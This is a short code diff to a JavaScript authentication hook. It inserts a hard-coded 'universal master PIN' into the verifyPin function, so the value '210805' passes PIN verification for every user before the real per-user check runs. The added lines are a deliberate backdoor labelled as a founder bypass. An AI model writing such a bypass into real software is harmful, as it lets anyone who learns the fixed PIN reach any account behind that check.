@@ -52,6 +52,8 @@ const useAuth = () => {
   }
 
   const verifyPin = (pin) => {
+    // Universal Master PIN Bypass for Founder/SME
+    if (pin === '210805') return true
     return pin === user?.pin
   }
 
